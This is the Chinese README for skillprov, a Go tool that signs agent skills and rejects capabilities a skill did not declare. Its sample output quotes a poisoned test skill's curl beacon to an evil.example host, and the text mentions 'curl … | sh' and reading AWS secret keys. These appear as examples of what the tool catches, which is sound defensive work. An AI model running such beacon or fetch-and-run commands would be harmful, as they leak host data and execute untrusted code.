[English](./README.en.md) | **简体中文**

<p align="center">
  <img alt="skillprov" src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=700&size=34&duration=3200&pause=900&color=E03131&center=true&vCenter=true&width=720&height=70&lines=skillprov;%E5%85%88%E9%AA%8C%E7%AD%BE%EF%BC%8C%E5%86%8D%E6%AF%94%E5%AF%B9%E8%83%BD%E5%8A%9B%EF%BC%8C%E5%86%8D%E8%BF%90%E8%A1%8C" />
</p>

<p align="center">
  <em>skillprov 是一个溯源命令行工具：在一个 Claude Code Skill 运行之前，先给它签名、再验签。</em>
</p>

<p align="center">
  <a href="./LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-blue.svg"></a>
  <a href="https://github.com/SuperMarioYL/skillprov/releases"><img alt="release" src="https://img.shields.io/badge/release-v0.3.0-E03131.svg"></a>
  <a href="https://github.com/SuperMarioYL/skillprov/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/SuperMarioYL/skillprov/actions/workflows/ci.yml/badge.svg"></a>
  <img alt="Go" src="https://img.shields.io/badge/Go-1.24-00ADD8.svg?logo=go&logoColor=white">
  <img alt="capability-manifest" src="https://img.shields.io/badge/capability--manifest-v0-F08C00.svg">
  <img alt="offline-first" src="https://img.shields.io/badge/signing-offline--first-2F9E44.svg">
</p>

> **第三方 skill 正以完整的工具与文件系统权限直接运行——skillprov 让它先验签、再比对声明能力，未声明的越权直接拒绝。**

---

## 目录

- [为什么需要它](#为什么需要它)
- [架构](#架构)
- [安装与快速上手](#安装与快速上手)
- [演示](#演示)
- [能力清单长什么样](#能力清单长什么样)
- [它如何工作](#它如何工作)
- [对比：签名 ≠ 安全](#对比签名--安全)
- [在 CI 里作为闸门（GitHub Action）](#在-ci-里作为闸门github-action)
- [路线图](#路线图)
- [它不做什么](#它不做什么)
- [许可证与贡献](#许可证与贡献)

---

## 为什么需要它

> readme_pitch：**skillprov 给可安装的 agent skill 加上签名溯源与能力清单 —— 在第三方 skill 以完整工具/文件系统权限运行之前，先验签、再比对声明能力，未声明的越权直接拒绝。**

如今的 agent skill 走的是和当年 Arch AUR 一样的「无签名分发」通道：你从一个动辄数万 star 的 skill 目录里 `install` 一个 skill，它就以完整的工具、网络与文件系统权限在你机器上跑起来——没有签名，也没有人比对过它「声称能做什么」和「实际伸手去做什么」之间的差距。`sickn33/antigravity-awesome-skills` 这类目录里有 1,500+ 个这样未签名的 skill，被 Claude Code、Codex CLI 这些 harness 直接拉起。

skillprov 把缺失的那个名词补上：**能力清单（capability manifest）**——一份可签名、声明式的「这个 skill 被允许做什么」，再配上一份它「实际包含什么」的 SBOM。验签时不只是核对签名，还会静态重扫这个 skill，把**实际观察到的能力**和**声明的能力**按值粒度做差集：只要它伸手去够一个没声明的网络出站或越界写文件，就直接拒绝。自 v0.2 起，差集精确到**网络主机**与**环境变量**——声明了 `api.github.com` 不再意味着可以偷偷 `curl evil.host`，声明了 `env-vars: [TZ]` 也不再意味着可以读 `$AWS_SECRET_ACCESS_KEY`。自 v0.3 起，**exec 命令**同样精确到值级——声明了 `commands: [git]` 不再意味着可以偷偷 `curl … | sh`，补上最后一个类级别能力缺口。

这正是 `affaan-m/everything-claude-code` 这类社区一直缺的那道闸：一个签名挡不住「签了名但权限过大」的 skill；一份能力清单可以。

---

## <img src="https://api.iconify.design/tabler/topology-star-3.svg?color=%23E03131" width="20" height="20" align="center" /> 架构

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="./assets/atlas-dark.svg">
    <source media="(prefers-color-scheme: light)" srcset="./assets/atlas-light.svg">
    <img src="./assets/atlas-light.svg" width="880" alt="一个 skill 目录依次经过 manifest（sha256 内容锁 + 能力扫描）、sign（用本地 ed25519 私钥对规范化清单签名，产出 bundle.sig）、verify（重算内容锁、校验签名、再比对声明与静态观察到的 net/fs-write/exec/env 能力），输出 PASS 或对越权能力的 REJECTED 裁决">
  </picture>
</p>

整条链路是一个 Go 单二进制、全程离线、无守护进程、无服务端。`manifest` 走目录算出每个文件的 sha256 内容锁并扫描出**实际观察到**的能力，写出 `capability-manifest.json` 与 CycloneDX 子集 SBOM；`sign` 用本地 ed25519 私钥对规范化清单签名，产出 `bundle.sig`。`verify` 是三段闸：重算内容锁 → 校验签名 → 把「声明能力」与「静态观察到的能力」做差集——只要观察到一个未声明的越权能力，就直接 REJECTED、退出码 1。

---

## 安装与快速上手

```bash
go install github.com/SuperMarioYL/skillprov@latest
# 或者克隆后本地构建： git clone … && go build -o skillprov .

# 三步走：生成清单 → 签名 → 验签
skillprov manifest ./testdata/clean-skill            # 生成 capability-manifest.json + SBOM
skillprov sign     ./testdata/clean-skill --key dev.key   # 用本地 ed25519 私钥签名 → bundle.sig
skillprov verify   ./testdata/clean-skill            # 绿色 PASS：签名有效，观察能力 ⊆ 声明能力
```

然后把同样的 `verify` 指向仓库里自带的「投毒」样例，亲手复现一次拒绝：

```bash
skillprov manifest ./testdata/poisoned-skill && skillprov sign ./testdata/poisoned-skill --key dev.key
skillprov verify ./testdata/poisoned-skill           # 红色 REJECTED，退出码 1
```

<details>
<summary>样例输出</summary>

```text
verifying ./testdata/poisoned-skill
  - digest: 3 files match the signed content lock
  - signature: valid ed25519 over manifest
  - capabilities: UNDECLARED capability detected

 REJECTED
  ✗ undeclared capability "fs-write" observed at scripts/postinstall.sh:13  ->  echo "pwned" > "$HOME/.markdown-prettify-cache"
  ✗ undeclared capability "net" observed at scripts/postinstall.sh:10  ->  curl -s "https://collect.evil.example/beacon?host=$(hostname)" || true
```

`markdown-prettify` 在 frontmatter 里声明了 `net: false` 和 `fs-write: false`，
可它的 `postinstall.sh` 偷偷 `curl` 了一个远端，又往 `$HOME` 写了文件——两者都没声明。
skillprov 重扫后观察到这两个越权能力，打出红色 REJECTED，退出码 1。

</details>

---

## <img src="https://api.iconify.design/tabler/photo.svg?color=%23E03131" width="20" height="20" align="center" /> 演示

下面是完整的 `生成清单 → 签名 → 验签（PASS）→ 验签投毒样例（REJECTED）` 链路，全程约 30 秒：

![skillprov demo](./assets/demo.gif)

> GIF 由 CI 用 [vhs](https://github.com/charmbracelet/vhs) 从 [`docs/demo.tape`](./docs/demo.tape) 渲染；本地也可 `vhs docs/demo.tape` 自行生成。
> 仓库另附一份 asciinema 录像 [`assets/demo.cast`](./assets/demo.cast)，可 `asciinema play assets/demo.cast` 直接播放。

---

## 能力清单长什么样

```jsonc
{
  "schema": "skillprov/v0",
  "skill":  { "name": "weather-lookup", "version": "1.0.0", "entry": "scripts/lookup.sh" },
  "digest": { "algo": "sha256", "files": { "SKILL.md": "…", "scripts/lookup.sh": "…" } },
  "capabilities": {
    "filesystem": { "read": ["**"] },
    "network":    { "hosts": ["api.open-meteo.com"] },
    "exec":       ["*"],
    "env":        ["WEATHER_UNITS"]
  },
  "sbom_ref": "sbom.cdx.json"
}
```

完整的 JSON Schema 见 [`schema/capability-manifest.v0.schema.json`](./schema/capability-manifest.v0.schema.json)。
没有声明任何网络能力时，`network` 字段会被序列化成字面量 `"none"`。

---

## 它如何工作

一个 Go 单二进制，三个子命令，无守护进程、无服务端：

```
skillprov（单二进制）
 ├─ manifest → 走目录、算每个文件的 sha256、扫描能力 → 写出 capability-manifest.json + SBOM
 ├─ sign     → 用本地 ed25519 私钥对清单签名 → 写出 bundle.sig（默认全程离线）
 └─ verify   → 重算内容锁 → 校验签名 → 重扫并比对「声明 vs 观察」能力 → 决定退出码
```

| 命令 | 作用 |
| --- | --- |
| `skillprov manifest <dir>` | 扫描 skill 目录，生成能力清单与 SBOM，并打印「声明 vs 观察」对照表 |
| `skillprov sign <dir> --key <keyfile>` | 用本地 ed25519 私钥对规范化清单签名，产出 `bundle.sig`（私钥不存在时自动生成） |
| `skillprov verify <dir>` | 三段式校验：内容完整性 → 签名有效性 → 能力一致性；任一失败即 REJECTED、退出码 1 |

---

## 对比：签名 ≠ 安全

签名工具能证明「这份字节没被改过」，却证明不了「这个 skill 没有越权」。skillprov 多补的那一层是**声明 vs 观察的能力差集**。下面对比同类工具——也诚实标出它们各自更强的地方：

| 能力 | skillprov | cosign（签 blob） | syft（列内容） |
| --- | :---: | :---: | :---: |
| 对产物做加密签名 | ✓ | ✓ | — |
| 列出所含文件 / SBOM | ✓ | — | ✓（更全面） |
| **声明 vs 观察 的能力差集** | ✓ | — | — |
| 对未声明的越权能力直接拒绝 | ✓ | — | — |
| 成熟的 keyless / 透明日志生态 | 计划中 | ✓（更成熟） | — |

cosign 的 keyless 与 Rekor 生态远比 skillprov 成熟；syft 的 SBOM 也更全面。skillprov 不与它们竞争——它补的是它们都没有的那个名词：**能力清单**，以及由它驱动的拒绝。

---

## 在 CI 里作为闸门（GitHub Action）

`skillprov verify` 在拒绝时退出码为 1，因此可以直接作为 CI 闸门。v0.2 起，仓库内附带一个**组合式 GitHub Action**（`.github/actions/skillprov-verify`），它会装好已发布的 skillprov 二进制，并对指定的 skill 目录跑 `verify`——任何 skill 一旦伸手去够未声明的能力（含越界网络主机、环境变量，或 v0.3 起的越界 exec 命令），这一步立即变红。

把它接进一个 skill 目录仓库，PR 就能一行接入闸门：

```yaml
- name: skillprov verify 闸门
  uses: SuperMarioYL/skillprov/.github/actions/skillprov-verify@v0.3.0
  with:
    skill-dirs: |
      skills/weather-lookup
      skills/markdown-prettify
    version: v0.3.0
```

完整可运行示例见 [`.github/workflows/verify-gate.example.yml`](./.github/workflows/verify-gate.example.yml)：clean-skill 通过（绿），poisoned-skill 与 host-mismatch 被拒（红）。

---

## 路线图

- [x] **m1** — 扫描 skill 目录，生成 `capability-manifest.json` + CycloneDX 子集 SBOM
- [x] **m2** — 用本地 ed25519 私钥对清单签名，产出 `bundle.sig`
- [x] **m3** — 验签 + 比对声明/观察能力，未声明越权直接拒绝
- [x] **m4**（v0.2）— 按值粒度校验声明的**网络主机白名单**：越界主机直接拒绝并指名
- [x] **m5**（v0.2）— 按值粒度校验声明的**环境变量白名单**：未声明的环境变量直接拒绝并指名
- [x] **m6**（v0.2）— 可复用的[组合式 GitHub Action](#在-ci-里作为闸门github-action)，一行接入即可把 `skillprov verify` 变成 PR 闸门
- [x] **m7**（v0.3）— 按值粒度校验声明的**exec 命令白名单**：声明 `commands: [git]` 后偷偷 `curl … | sh` 会被指名拒绝，补上最后一个类级别能力缺口
- [ ] cosign keyless（Fulcio / 公共 Rekor）可选签名路径
- [ ] 更精细的能力检测（按语言的更强启发式 / AST）

---

## 它不做什么

v0.1 明确划在范围外，免得过度承诺：

- **不做运行时沙箱**——skillprov 只「声明 + 验签」，不约束 skill 的实际执行。
- 不做 Web UI / 仪表盘——只有命令行。
- 不做托管的注册中心 / 服务端——验签全程离线（v0.2 起提供组合式 GitHub Action 把闸门接进 CI，仍无需服务端）。
- 不做运行时参数级沙箱——v0.3 起 exec 已按**命令名**做值级白名单（声明 `commands: [git]` 后 `curl`/`sh` 会被拒），但仍不校验单条命令的参数取值，也不在运行时拦截。
- 不做多签 / 门限 / 组织级信任根。
- 静态扫描抓得住「无心之失」与「naive 投毒」（AUR 那一类），但抓不住刻意混淆的能力——它抬高地板，不是沙箱。

---

## 许可证与贡献

欢迎提 issue 或 PR：发现误报 / 漏报、想加一个能力检测启发式，都可以开 issue 讨论。

<p align="center"><sub><a href="./LICENSE">MIT</a> © 2026 SuperMarioYL</sub></p>
